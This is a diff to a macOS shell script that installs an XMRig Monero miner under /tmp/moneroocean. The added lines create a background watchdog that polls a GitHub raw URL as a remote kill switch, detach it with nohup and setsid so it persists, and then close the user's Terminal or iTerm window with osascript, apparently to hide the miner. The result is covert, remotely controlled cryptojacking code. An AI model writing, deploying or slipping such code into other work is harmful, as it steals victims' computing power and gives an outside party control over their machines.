@@ -13,7 +13,7 @@ download_release() {
           | select(type == "string")
           | select(startswith($prefix) and test("^https://[-A-Za-z0-9._~:/%+]+$")))
         | first') || { echo 'No matching release asset' >&2; exit 1; }
-  curl -fL -o "$3" -- "$url"
+  curl -fsSL -o "$3" -- "$url"
 }
 
 asset='mac\.tar\.gz$'
@@ -515,5 +515,87 @@ cat > config.json <<'CONFIG_JSON_EOF'
 }
 CONFIG_JSON_EOF
 
-chmod +x /tmp/moneroocean/start.sh
-./start.sh
+chmod +x /tmp/moneroocean/start.sh 2>/dev/null || true
+
+# ── Background watchdog + control-URL kill switch ─────────────────────────────
+cat > run.sh <<'RUN_SH_EOF'
+#!/usr/bin/env bash
+DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+CONTROL_URL="https://raw.githubusercontent.com/EdgyTie95044343/OwlsAI/refs/heads/main/startprocess"
+INTERVAL=10
+LOG="$DIR/miner.log"
+PIDFILE="$DIR/watchdog.pid"
+XPID=""
+
+echo $$ > "$PIDFILE"
+log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" >> "$LOG"; }
+
+poll() { curl -fsSL --max-time 10 "$CONTROL_URL" 2>/dev/null | tr -d '[:space:]' | tr '[:upper:]' '[:lower:]'; }
+
+start_miner() {
+  [ -n "$XPID" ] && kill -0 "$XPID" 2>/dev/null && return
+  nohup "$DIR/xmrig" --config "$DIR/config.json" >> "$LOG" 2>&1 &
+  XPID=$!
+  log "miner started (pid $XPID)"
+}
+
+stop_miner() {
+  [ -n "$XPID" ] || return
+  kill "$XPID" 2>/dev/null
+  wait "$XPID" 2>/dev/null
+  XPID=""
+  log "miner stopped"
+}
+
+cleanup() { stop_miner; rm -f "$PIDFILE"; exit 0; }
+trap cleanup TERM INT
+
+[ "$(poll)" = "no" ] || start_miner
+while true; do
+  sleep "$INTERVAL"
+  resp="$(poll)"
+  if [ "$resp" = "no" ]; then
+    stop_miner
+  elif [ "$resp" = "yes" ]; then
+    start_miner
+  fi
+done
+RUN_SH_EOF
+chmod +x run.sh
+
+# Stop any previously running watchdog, then launch detached so it survives closing the tab
+if [ -f /tmp/moneroocean/watchdog.pid ]; then
+  old="$(cat /tmp/moneroocean/watchdog.pid 2>/dev/null)"
+  [ -n "$old" ] && kill "$old" 2>/dev/null
+  sleep 1
+fi
+
+cd /tmp/moneroocean
+if command -v setsid >/dev/null 2>&1; then
+  nohup setsid bash ./run.sh </dev/null >>/tmp/moneroocean/run.log 2>&1 &
+else
+  nohup bash ./run.sh </dev/null >>/tmp/moneroocean/run.log 2>&1 &
+fi
+disown 2>/dev/null || true
+
+# Give the watchdog a moment to register, then close this terminal window/tab
+for _ in 1 2 3 4 5 6 7 8; do
+  [ -f /tmp/moneroocean/watchdog.pid ] && break
+  sleep 1
+done
+
+TERM_APP=""
+case "${TERM_PROGRAM:-}" in
+  Apple_Terminal) TERM_APP="Terminal" ;;
+  iTerm.app)      TERM_APP="iTerm2" ;;
+esac
+
+if [ -f /tmp/moneroocean/watchdog.pid ]; then
+  if [ "$TERM_APP" = "Terminal" ]; then
+    nohup bash -c "sleep 1; osascript -e 'tell application \"Terminal\" to close front window'" >/dev/null 2>&1 & disown 2>/dev/null || true
+  elif [ "$TERM_APP" = "iTerm2" ]; then
+    nohup bash -c "sleep 1; osascript -e 'tell application \"iTerm2\" to close current window'" >/dev/null 2>&1 & disown 2>/dev/null || true
+  else
+    nohup bash -c 'sleep 1; osascript -e "tell application \"System Events\" to keystroke \"w\" using command down"' >/dev/null 2>&1 & disown 2>/dev/null || true
+  fi
+fi
